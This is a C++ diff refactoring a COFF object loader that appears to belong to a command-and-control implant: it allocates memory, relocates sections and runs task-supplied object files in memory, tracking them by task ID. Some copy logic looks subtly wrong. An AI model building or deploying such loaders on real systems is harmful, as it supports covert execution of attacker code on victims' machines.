@@ -289,7 +289,6 @@ namespace Objects {
     SIZE_T GetFunctionMapSize(_executable *object) {
 
         char sym_name[9]    = { };
-        char *buffer        = nullptr;
         int counter         = 0;
 
         for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
@@ -297,7 +296,8 @@ namespace Objects {
             auto reloc          = RELOC_SECTION(object->buffer, object->section);
 
             for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
-                const auto symbols = object->symbols;
+                const auto symbols  = object->symbols;
+                char *buffer        = nullptr;
 
                 if (_coff_symbol *symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
                     MemSet(sym_name, 0, sizeof(sym_name));
@@ -319,20 +319,42 @@ namespace Objects {
         return sizeof(void*) * counter;
     }
 
-    VOID AddCoff(_executable *object) {
+    VOID AddCoff(_coff_params *coff) {
 
+        _coff_params *head = Ctx->coffs;
+
+        if (!Ctx->coffs) {
+            Ctx->coffs = coff;
+        }
+        else {
+            do {
+                if (head) {
+                    if (head->next) {
+                        head = head->next;
+                    }
+                    else {
+                        head->next = coff;
+                        break;
+                    }
+                }
+                else {
+                    break;
+                }
+            }
+            while (true);
+        }
     }
 
-    VOID RemoveCoff(_executable *object) {
+    VOID RemoveCoff(_coff_params *coff) {
 
-        _executable *prev = { };
+        _coff_params *prev = { };
 
-        if (!object) {
+        if (!coff) {
             return;
         }
 
         for (auto head = Ctx->coffs; head; head = head->next) {
-            if (head->task_id == object->task_id) {
+            if (head->task_id == coff->task_id) {
                 if (prev) {
                     prev->next = head->next;
                 }
@@ -340,7 +362,9 @@ namespace Objects {
                     Ctx->coffs = head->next;
                 }
 
-                MemSet(object->buffer, 0, object->size);
+                MemSet(coff->entrypoint, 0, coff->entrypoint_length);
+                MemSet(coff->data, 0, coff->data_size);
+                MemSet(coff->args, 0, coff->args_size);
                 return;
             }
 
@@ -348,76 +372,76 @@ namespace Objects {
         }
     }
 
-    VOID Cleanup(_executable *object) {
+    VOID Cleanup(_executable *exe) {
 
-        if (!object || !object->base) {
+        if (!exe || !exe->base) {
             return;
         }
-        if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &object->base, &object->size, PAGE_READWRITE, nullptr))) {
+        if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &exe->base, &exe->size, PAGE_READWRITE, nullptr))) {
             // LOG ERROR
             return;
         }
 
-        MemSet(object->base, 0, object->size);
+        MemSet(exe->base, 0, exe->size);
 
-        void *pointer   = object->base;
-        size_t size     = object->size;
+        void *pointer   = exe->base;
+        size_t size     = exe->size;
 
         if (!NT_SUCCESS(ntstatus = Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
             // LOG ERROR
             return;
         }
 
-        if (object->sec_map) {
-            ZeroFree(object->sec_map, object->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
-            object->sec_map = nullptr;
+        if (exe->sec_map) {
+            ZeroFree(exe->sec_map, exe->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
+            exe->sec_map = nullptr;
         }
 
-        ZeroFree(object, sizeof(_executable));
+        ZeroFree(exe, sizeof(_executable));
     }
 
     VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size, uint32_t task_id) {
 
         bool success        = true;
-        _executable *object = CreateImageData((uint8_t*) data); ;
+        _executable *image  = CreateImageData((uint8_t*) data); ;
 
-        x_assertb(object->buffer    = (uint8_t*) data);
-        x_assertb(object->sec_map   = (_object_map*) Malloc(sizeof(void*) * sizeof(_object_map)));
-        x_assertb(ImageCheckArch(object));
+        x_assertb(image->buffer    = (uint8_t*) data);
+        x_assertb(image->sec_map   = (_object_map*) Malloc(sizeof(void*) * sizeof(_object_map)));
+        x_assertb(ImageCheckArch(image));
 
         // NOTE: sec_map seems to be the only thing that persists
-        object->fn_map->size = GetFunctionMapSize(object);
+        image->fn_map->size = GetFunctionMapSize(image);
 
         // NOTE: calculating address/size of sections before base relocation
-        for (uint16_t sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
-            const auto section = SECTION_HEADER(object->buffer, sec_index);
+        for (uint16_t sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
+            const auto section = SECTION_HEADER(image->buffer, sec_index);
 
-            object->size += section->SizeOfRawData;
-            object->size = (size_t) PAGE_ALIGN(object->size);
+            image->size += section->SizeOfRawData;
+            image->size = (size_t) PAGE_ALIGN(image->size);
         }
 
-        object->size += object->fn_map->size;
+        image->size += image->fn_map->size;
 
-        x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &object->base, object->size, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-        auto next = (uint8_t*) object->base;
+        x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &image->base, image->size, &image->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+        auto next = (uint8_t*) image->base;
 
-        for (uint16_t sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
-            const auto section = SECTION_HEADER(object->buffer, sec_index);
+        for (uint16_t sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
+            const auto section = SECTION_HEADER(image->buffer, sec_index);
 
-            object->sec_map[sec_index].size     = section->SizeOfRawData;
-            object->sec_map[sec_index].address  = next;
+            image->sec_map[sec_index].size     = section->SizeOfRawData;
+            image->sec_map[sec_index].address  = next;
 
-            next += object->section->SizeOfRawData;
+            next += image->section->SizeOfRawData;
             next = PAGE_ALIGN(next);
 
-            MemCopy(object->sec_map[sec_index].address, RVA(PBYTE, object->buffer, object->section->SizeOfRawData), object->section->SizeOfRawData);
+            MemCopy(image->sec_map[sec_index].address, RVA(PBYTE, image->buffer, image->section->SizeOfRawData), image->section->SizeOfRawData);
         }
 
         // NOTE: function map goes after the section map ?
-        object->fn_map = (_object_map*) next;
+        image->fn_map = (_object_map*) next;
 
-        x_assertb(BaseRelocation(object));
-        x_assertb(ExecuteFunction(object, entrypoint, args, args_size));
+        x_assertb(BaseRelocation(image));
+        x_assertb(ExecuteFunction(image, entrypoint, args, args_size));
 
     defer:
         if (success) {
@@ -427,24 +451,25 @@ namespace Objects {
             // LOG ERROR
         }
 
-        if (object) {
-            Cleanup(object);
+        if (image) {
+            Cleanup(image);
         }
     }
 
-    VOID CoffThread(_coff_params *params) {
+    VOID CoffThread(_coff_params *coff) {
 
-        if (!params->entrypoint || !params->data) {
+        if (!coff->entrypoint || !coff->data) {
             goto defer;
         }
 
-        // TODO: store params->entrypoint/data/task_id
-        CoffLoader(params->entrypoint, params->data, params->args, params->args_size, params->task_id);
+        // TODO: store params
+        CoffLoader(coff->entrypoint, coff->data, coff->args, coff->args_size, coff->task_id);
 
         defer:
-        ZeroFree(params->entrypoint, params->entrypoint_length);
-        ZeroFree(params->data, params->data_size);
-        ZeroFree(params->args, params->args_size);
-        MemSet(params, 0, sizeof(_coff_params));
+        // TODO: allow choices for caching coffs?
+        ZeroFree(coff->entrypoint, coff->entrypoint_length);
+        ZeroFree(coff->data, coff->data_size);
+        ZeroFree(coff->args, coff->args_size);
+        MemSet(coff, 0, sizeof(_coff_params));
     }
 }
